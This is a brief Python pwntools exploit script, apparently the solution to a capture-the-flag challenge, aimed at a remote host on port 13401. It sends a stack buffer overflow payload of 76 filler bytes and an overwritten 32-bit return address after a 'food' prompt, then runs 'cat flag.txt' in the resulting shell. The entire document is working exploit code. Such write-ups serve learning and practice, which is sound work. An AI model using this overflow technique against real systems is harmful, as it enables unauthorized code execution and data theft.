from pwn import *


r = remote("challs.pwnoh.io", 13401)



r.sendlineafter(b'food', b'A'*76 + p32(0x80491e6))

r.sendline(b'cat flag.txt')

r.interactive()
